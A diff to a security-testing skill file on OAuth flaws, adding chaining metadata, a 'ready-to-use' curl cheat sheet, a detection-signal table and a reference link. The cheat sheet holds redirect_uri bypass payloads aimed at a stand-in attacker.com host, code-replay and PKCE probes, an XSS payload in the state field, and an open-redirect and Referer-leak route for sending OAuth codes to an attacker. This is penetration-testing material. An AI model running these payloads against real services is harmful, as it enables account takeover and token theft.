@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-authz-01, wstg-authz-02]
+prerequisites: [wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-authz-01: "OAuth Weakness + Directory Traversal (leaks client secrets/signing keys from disk) = attacker forges valid OAuth tokens for any account (Critical)"
+  wstg-authz-02: "OAuth Weakness + Authorization Bypass = a token obtained through the OAuth flaw is then used to walk past authorization checks application-wide (Full Application Compromise, Critical)"
 ---
 
 # wstg-authz-05
@@ -516,6 +518,69 @@ tester.generate_report()
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use OAuth Cheat Sheet
+
+```bash
+BASE="https://auth.{target}"
+CLIENT_ID="{client_id}"
+REDIRECT="https://client.{target}/callback"
+
+# redirect_uri bypass sweep
+for r in "https://attacker.com" "$REDIRECT.attacker.com" "$REDIRECT@attacker.com" \
+         "$REDIRECT%2f@attacker.com" "http://localhost/callback" "http://127.0.0.1/callback" \
+         "$REDIRECT/../../attacker.com" "javascript:alert(1)"; do
+  loc=$(curl -s -o /dev/null -D - "$BASE/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$r&response_type=code&scope=openid" \
+        | grep -i "^location:")
+  echo "[$r] -> $loc"
+done
+
+# Missing/empty state (CSRF) probe
+curl -s "$BASE/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$REDIRECT&response_type=code&scope=openid"
+curl -s "$BASE/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$REDIRECT&response_type=code&state=&scope=openid"
+
+# Authorization code replay (2nd use should fail)
+CODE="captured_code"
+curl -s -X POST "$BASE/oauth/token" -d "grant_type=authorization_code&code=$CODE&redirect_uri=$REDIRECT&client_id=$CLIENT_ID&client_secret=$SECRET"
+curl -s -X POST "$BASE/oauth/token" -d "grant_type=authorization_code&code=$CODE&redirect_uri=$REDIRECT&client_id=$CLIENT_ID&client_secret=$SECRET"
+
+# Token endpoint without PKCE code_verifier
+curl -s -X POST "$BASE/oauth/token" -d "grant_type=authorization_code&code=$CODE&redirect_uri=$REDIRECT&client_id=$CLIENT_ID"
+
+# Scope escalation — use a read-only token against a write endpoint
+curl -s -X POST "https://{target}/api/user/update" -H "Authorization: Bearer $READ_ONLY_TOKEN" -d '{"name":"test"}'
+
+# Refresh token reuse after rotation (old token should be revoked)
+curl -s -X POST "$BASE/oauth/token" -d "grant_type=refresh_token&refresh_token=$OLD_REFRESH&client_id=$CLIENT_ID"
+
+# redirect_uri to an accepted-domain open redirect — if attacker.com is rejected but the
+# whitelist is domain-level, an open redirect on that same domain still exfiltrates the code/token
+curl -s -o /dev/null -D - "$BASE/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=https%3A%2F%2Faccounts.$TARGET_DOMAIN%2FBackToAuthSubTarget%3Fnext%3Dhttps%3A%2F%2Fattacker.com&response_type=code&scope=openid" | grep -i "^location:"
+
+# Invalid `scope` value to bypass a redirect_uri filter that only runs when scope validates
+curl -s -o /dev/null -D - "$BASE/oauth/authorize?client_id=$CLIENT_ID&scope=a&redirect_uri=https://attacker.com" | grep -i "^location:"
+
+# XSS via redirect_uri using a data: URI + payload reflected in `state`
+curl -s "$BASE/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=data:text/html,a&state=<script>alert(document.domain)</script>"
+
+# Stealing the token via Referer leakage — if HTML injection (but not XSS) exists anywhere
+# post-auth, plant an <img src="https://attacker.com/log"> and lure the victim there after
+# login; the Referer header on the image request carries the OAuth code/token in the URL
+```
+
+### Detection Patterns
+
+| Signal                                              | Meaning                        |
+| ------------------------------------------------------ | --------------------------------- |
+| `Location:` header contains `attacker`/`localhost`      | redirect_uri bypass              |
+| Authorization succeeds without `state`                  | Missing CSRF protection          |
+| Second use of same `code` returns a token                | Code replay not prevented        |
+| Token endpoint issues token without `code_verifier`      | PKCE not enforced                |
+| Read-scope token succeeds on write endpoint              | Scope not enforced server-side   |
+
+---
+
 ## Remediation Guide
 
 ### 1. Strict Redirect URI Validation
@@ -693,6 +758,7 @@ def token():
 - [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
 - [RFC 7636 - PKCE](https://tools.ietf.org/html/rfc7636)
 - [PortSwigger OAuth](https://portswigger.net/web-security/oauth)
+- [PayloadsAllTheThings - OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration)
 
 
 ---
